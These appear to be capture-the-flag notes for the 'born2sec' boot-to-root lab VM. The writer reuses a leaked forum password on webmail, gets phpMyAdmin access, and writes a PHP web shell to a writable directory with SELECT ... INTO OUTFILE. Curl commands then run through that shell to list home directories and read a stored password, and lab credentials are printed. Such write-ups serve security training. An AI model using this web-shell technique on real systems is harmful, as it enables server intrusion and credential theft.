log page on forum : 
```1q\Ej?*5K5cy*AJ```

forum : 
lmezard:1q\Ej?*5K5cy*AJ 	okok

with that we got the user mail :
laurie@born2sec.net

nikto -host 10.12.1.108 -port 336
```
osvdb-3092: /forum/ : this might be interesting
osvdb-3093: /webmail
/phypmyadmin/: phpmyadmin directory found 
```
so we got a server mail let's try our login:passwd
laurie@born2sec.net:1q\Ej?*5K5cy*AJ
it works ! and we have a mail with root:phpmyadminpasswd

nice but we can/t write on /var/www :/
let's see if we have a writable page on this site..
git clone https://github.com/maurosoria/dirsearch.git
python3 dirsearch/dirsearch.py 
```
[10:24:08] 301 -  319B  - /forum/images  ->  https://10.12.1.108/forum/images/
[10:24:08] 301 -  321B  - /forum/includes  ->  https://10.12.1.108/forum/includes/
[10:24:08] 200 -    5KB - /forum/includes/
[10:24:08] 200 -    5KB - /forum/index.php
[10:24:08] 200 -    5KB - /forum/index
[10:24:09] 200 -    5KB - /forum/index.php/login/
[10:24:09] 301 -  315B  - /forum/js  ->  https://10.12.1.108/forum/js/
[10:24:09] 301 -  317B  - /forum/lang  ->  https://10.12.1.108/forum/lang/
[10:24:10] 301 -  320B  - /forum/modules  ->  https://10.12.1.108/forum/modules/
[10:24:15] 301 -  324B  - /forum/templates_c  ->  https://10.12.1.108/forum/templates_c/
[10:24:15] 200 -    5KB - /forum/templates_c/
[10:24:15] 301 -  319B  - /forum/themes  ->  https://10.12.1.108/forum/themes/
[10:24:15] 301 -  319B  - /forum/update  ->  https://10.12.1.108/forum/update/
```
hey we can write on /forum/templates_c :D 

in phpMyadmin : 
```SELECT "<?php system($_GET['cmd']) ?>" 
into outfile "/var/www/forum/templates_c/givemeshell.php"```

```
curl  https://10.12.1.108/forum/templates_c/givemeshell.php?cmd="id" -k
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
ok we can do some digging 

curl  https://10.12.1.108/forum/templates_c/givemeshell.php?cmd="ls%20/home" -k
```LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz
```

curl  https://10.12.1.108/forum/templates_c/givemeshell.php?cmd="cat%20/home/LOOKATME/password" -k
```lmezard:G!@M6f4Eatau{sF"```


